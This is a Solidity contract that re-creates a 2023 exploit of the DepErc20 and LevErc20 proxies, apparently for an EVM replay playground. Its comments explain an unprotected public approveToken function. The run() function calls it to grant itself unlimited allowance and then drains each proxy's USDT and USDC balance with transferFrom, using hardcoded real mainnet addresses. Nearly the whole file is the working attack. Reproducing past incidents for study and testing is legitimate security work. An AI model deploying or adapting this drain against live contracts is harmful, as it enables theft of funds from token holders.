// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground.
//
// Faithful copy of the inline attack from the Foundry test
// `ContractTest.testApprove()` (2023-06-DEPUSDT_LEVUSDC_exp/test/DEPUSDT_LEVUSDC_exp.sol).
// The original test runs the whole attack inline (`attacker = address(this)`) —
// there is no standalone exploit contract to deploy — so this file re-creates it
// as a self-contained contract with a `run()` entrypoint, per the
// `syntheticExploit` mechanism (see docs/EVM-playground-2.md §3).
//
// Root cause (same bug, two independent victims): both DepErc20 (behind proxy
// ProxyDEPUSDT) and LevErc20 (behind proxy ProxyLEVUSDC) inherit a CurveSwap
// helper whose `approveToken(address token, address spender, uint256 amount)`
// is `public` with no access control. Anyone can call it directly on the proxy
// and set themselves as `spender` with unlimited allowance over the contract's
// own token balance, then drain it with `transferFrom`.
//
// The original attack transactions were 6 blocks apart (17,484,161 and
// 17,484,167) on two unrelated proxies sharing the same bug class — there is no
// functional dependency between them (no shared state, no timestamp/block
// check in `approveToken`), so both drains are run back-to-back at the single
// fork block here.

interface IProxy {
    function approveToken(address token, address pool, uint256 amount) external;
}

interface IToken {
    function balanceOf(address who) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract DEPUSDT_LEVUSDC_Drain {
    IToken constant DEPUSDT = IToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IToken constant LEVUSDC = IToken(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IProxy constant ProxyDEPUSDT = IProxy(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f);
    IProxy constant ProxyLEVUSDC = IProxy(0x2a2b195558cF89AA617979ce28880BbF7e17bc45);

    function run() external {
        // Drain 1: ProxyDEPUSDT's own USDT balance.
        // No access control. Thanks to this, attacker obtained authorization to transfer funds.
        ProxyDEPUSDT.approveToken(address(DEPUSDT), address(this), type(uint256).max);
        DEPUSDT.transferFrom(address(ProxyDEPUSDT), address(this), DEPUSDT.balanceOf(address(ProxyDEPUSDT)));

        // Drain 2: ProxyLEVUSDC's own USDC balance — same bug, independent contract.
        ProxyLEVUSDC.approveToken(address(LEVUSDC), address(this), type(uint256).max);
        LEVUSDC.transferFrom(address(ProxyLEVUSDC), address(this), LEVUSDC.balanceOf(address(ProxyLEVUSDC)));
    }
}
